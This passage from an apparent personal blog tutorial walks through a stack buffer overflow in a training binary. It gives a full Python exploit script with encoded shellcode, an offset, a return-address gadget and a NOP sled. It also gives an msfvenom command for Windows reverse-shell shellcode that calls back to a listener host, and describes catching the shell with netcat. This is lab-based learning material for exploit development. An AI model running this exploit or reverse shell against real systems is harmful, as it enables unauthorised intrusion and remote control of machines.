+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xdb\xdb\xd9\x74\x24\xf4\xba\x36\xaf\x2d\xc5</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x5b\x31\xc9\xb1\x31\x31\x53\x18\x83\xeb\xfc</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x03\x53\x22\x4d\xd8\x39\xa2\x13\x23\xc2\x32</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x74\xad\x27\x03\xb4\xc9\x2c\x33\x04\x99\x61</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbf\xef\xcf\x91\x34\x9d\xc7\x96\xfd\x28\x3e</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x98\xfe\x01\x02\xbb\x7c\x58\x57\x1b\xbd\x93</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xaa\x5a\xfa\xce\x47\x0e\x53\x84\xfa\xbf\xd0</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd0\xc6\x34\xaa\xf5\x4e\xa8\x7a\xf7\x7f\x7f</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\xae\x5f\x81\xd6\xda\xe9\x99\x3b\xe6\xa0</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x12\x8f\x9c\x32\xf3\xde\x5d\x98\x3a\xef\xaf</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe0\x7b\xd7\x4f\x97\x75\x24\xed\xa0\x41\x57</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x29\x24\x52\xff\xba\x9e\xbe\xfe\x6f\x78\x34</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x0c\xdb\x0e\x12\x10\xda\xc3\x28\x2c\x57\xe2</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfe\xa5\x23\xc1\xda\xee\xf0\x68\x7a\x4a\x56</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x94\x9c\x35\x07\x30\xd6\xdb\x5c\x49\xb5\xb1</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa3\xdf\xc3\xf7\xa4\xdf\xcb\xa7\xcc\xee\x40</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x28\x8a\xee\x82\x0d\x74\x0d\x07\x7b\x1d\x88</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc2\xc6\x40\x2b\x39\x04\x7d\xa8\xc8\xf4\x7a</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb0\xb8\xf1\xc7\x76\x50\x8b\x58\x13\x56\x38</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x58\x36\x35\xdf\xca\xda\x94\x7a\x6b\x78\xe9</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf_totlen</span> <span class="o">=</span> <span class="mi">1024</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">146</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="c1"># making code more flexible</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xc3\x14\x04\x08</span><span class="s1">&#39;</span>	<span class="c1"># memory address of our gadget in little endian</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span> 
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">buf_totlen</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Sent: exploit&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>We send it again and begin stepping into things again. We go all the way up to the <code>ret</code> statement from <code>doResponse</code> and we can see our address that we gave our exploit coming down the pipeline:
+<img alt="finding5" src="/052825//0528-finding5.png">
+You can use <code>u esp</code> in WinDbg to see the shellcode:
+<img alt="finding6" src="/052825//0528-finding6.png">
+If we step through, this will actually crash. Why? The code is there, the offset is correct, the bad characters have been eliminated, what could be left? Let&rsquo;s explore:</p>
+<h2 id="the-nop-sled">The NOP Sled<a href="#the-nop-sled" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>When we are trying to exploit this stack-based buffer overflow, we are not going for anything other than a bullseye. The code MUST run from beginning to end. This is where the NOP sled (or NOP slide) comes in. A NOP sled is a series of harmless instructions (usually 0x90 in x86 for a no-operation code, hence NOP) placed before your shellcode in memory. If the program’s instruction pointer (<code>EIP</code>) lands anywhere in the sled, it will &ldquo;slide&rdquo; down into the shellcode and execute it.</p>
+<p>But without a NOP sled, your return address must land exactly on the first byte of the shellcode. If you get it even one byte off, you’ll start executing in the middle of your shellcode, stepping on itself. In the future, I may do a post on why a NOP sled isn&rsquo;t the best way to do things, because justinsteven also includes that section in his thorough explanation.</p>
+<p>Without the nop sled, something like this could happen:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Buffer:
+</span></span><span class="line"><span class="cl">...code...code...code...code...code...
+</span></span><span class="line"><span class="cl">                        ↑
+</span></span><span class="line"><span class="cl">                 we may land here 😬
+</span></span></code></pre></div><p>But with the nop sled, it creates a one-way path to the beginning of the shellcode:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">NOP
+</span></span><span class="line"><span class="cl">     NOP
+</span></span><span class="line"><span class="cl">          NOP
+</span></span><span class="line"><span class="cl">               NOP
+</span></span><span class="line"><span class="cl">                    NOP  ...code...code...code...code...
+</span></span><span class="line"><span class="cl">                   ↑
+</span></span><span class="line"><span class="cl">                     we can land anywhere before here    
+</span></span></code></pre></div><p>In short, memory may not always act precisely how we want it to, so this just helps our odds.</p>
+<p>That being said, let&rsquo;s just edit our code to include a little <code>nop</code> action:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xc3\x14\x04\x08</span><span class="s1">&#39;</span>	<span class="c1"># memory address of our gadget in little endian</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span>     <span class="c1"># quick nop sled</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span> 
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span><span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">buf_totlen</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span></code></pre></div><p>We can restart the program, shoot it off again, and just like that&hellip;
+<img alt="nop1" src="/052825//0528-nop1.png">
+We have our first successful exploitation of our BoF.</p>
+<hr>
+<h1 id="full-blown-reverse-shell">Full-Blown Reverse Shell<a href="#full-blown-reverse-shell" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>For the coup de grâce, we want to get a reverse shell. For mine I just stuck to basics and used <code>msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name shellcode LPORT=4444 LHOST=192.168.1.222 EXITFUNC=thread</code> and then replaced the existing shellcode. I set up a netcat reverse listener and caught the shell.
+<img alt="shell1" src="/052825//0528-shell1.png"></p>
+<hr>
+<h1 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Stack-based BoFs are a really interesting topic, and when I first began learning pentesting 2 years ago I didn&rsquo;t take them seriously. At the time, the OSCP had just removed them from their curriculum and it just seemed like nerd computer science stuff that I didn&rsquo;t care about, and that anything that could be BoF&rsquo;d was probably some old system that you could root 10 different ways without it. Now that I have an interest in exploit dev, I realize now that is absolutely untrue. While this level of exploitation could now be considered a low-level hack, it is absolutely impossible to continue further into this field without understanding it. There are also no shortcuts; you either get it or you don&rsquo;t. I will be doing more exercises repeating what I&rsquo;ve learned here, and take it further and further, adding more and more security controls.</p>
+<p>Again, special thanks to         <a href="https://github.com/justinsteven" target="_blank" rel="noopener">justinsteven</a> and his awesome BoF project.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="https://goobersec.github.io/posts/examining-binaries-with-gdb/" class="button inline next">
+         [<span class="button__text">Examining Binaries With Gdb</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
